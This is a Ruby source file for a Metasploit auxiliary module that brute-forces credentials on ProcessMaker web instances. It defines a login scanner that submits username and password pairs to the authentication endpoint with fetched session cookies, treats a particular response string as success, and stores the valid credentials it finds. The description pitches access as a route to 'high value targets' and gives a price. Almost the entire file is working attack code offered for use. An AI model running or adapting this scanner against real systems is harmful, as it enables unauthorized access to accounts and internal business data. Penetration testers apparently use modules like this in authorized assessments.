##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class ProcessMaker < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            req = cli.request_cgi({
              'uri' => '/sysworkflow/en/neoclassic/login/login'
            })

            res = cli.send_recv(req)

            cookies = res.get_cookies

            data = Rex::MIME::Message.new
            data.add_part("[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]", nil, nil, 'form-data; name="__notValidateThisFields"')
            data.add_part("[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]", nil, nil, 'form-data; name="DynaformRequiredFields"')
            data.add_part('-18000', nil, nil, 'form-data; name="form[BROWSER_TIME_ZONE_OFFSET]"')
            data.add_part(credential.private, nil, nil, 'form-data; name="form[USR_PASSWORD]"')
            data.add_part(credential.public, nil, nil, 'form-data; name="form[USR_USERNAME]"')
            data.add_part('', nil, nil, 'form-data; name="form[USR_PASSWORD_MASK]"')
            data.add_part('en', nil, nil, 'form-data; name="form[USER_LANG]"')
            data.add_part('', nil, nil, 'form-data; name="form[URL]"')
            data.add_part('0', nil, nil, 'form-data; name="form[FAILED_LOGINS]"')

            req = cli.request_cgi({
              'method' => 'POST',
              'uri' => '/sysworkflow/en/neoclassic/login/authentication.php',
              'data' => data.to_s,
              'ctype' => 'multipart/form-data; boundary=' + data.bound,
              'cookie' => cookies,
              'headers' => {
                'Referer' => '/sysworkflow/en/neoclassic/login/login'
              }
            })

            res = cli.send_recv(req)

            if res && res.code == 200 && res.body =~ /Loading styles and images/
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            end
          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'ProcessMaker Credential Bruteforce',
        'Description'    => %q(
        This module attempts to bruteforce credentials on a ProcessMaker instance.

        ProcessMaker is a popular enterprise software tool to enable businesses to
        manage defined processes for business tasks and workflows. Privileged access
        to a ProcessMaker instance may yield significant insight into internal
        processes, key stakeholders, and high value targets on the network.

        Categories: Open Source, Enterprise

        Price: 3

        Video: https://asciinema.org/a/2drpjphgq6p07xwofqpka53ea

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
      ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 80,
            'STOP_ON_SUCCESS' => true
        }
    )
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::ProcessMaker.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        uri: datastore['TARGETURI'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
